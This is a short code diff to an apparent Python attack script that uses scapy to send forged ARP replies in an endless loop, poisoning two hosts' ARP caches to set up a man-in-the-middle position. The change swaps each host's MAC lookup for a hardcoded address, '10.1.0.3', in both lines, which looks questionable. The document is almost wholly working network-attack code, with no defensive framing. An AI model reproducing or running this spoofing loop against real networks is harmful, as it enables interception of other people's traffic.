@@ -6,8 +6,8 @@ def attack(target, spoof):
     print("Attack launched, stop with CTRL+C")
     try:
         while True:
-            scapy.send(scapy.ARP(op=2, pdst=target, hwdst=scapy.getmacbyip(target), psrc=spoof))
-            scapy.send(scapy.ARP(op=2, pdst=spoof, hwdst=scapy.getmacbyip(spoof), psrc=target))
+            scapy.send(scapy.ARP(op=2, pdst=target, hwdst=scapy.getmacbyip("10.1.0.3"), psrc=spoof))
+            scapy.send(scapy.ARP(op=2, pdst=spoof, hwdst=scapy.getmacbyip("10.1.0.3"), psrc=target))
             time.sleep(1)
     except KeyboardInterrupt:
         return
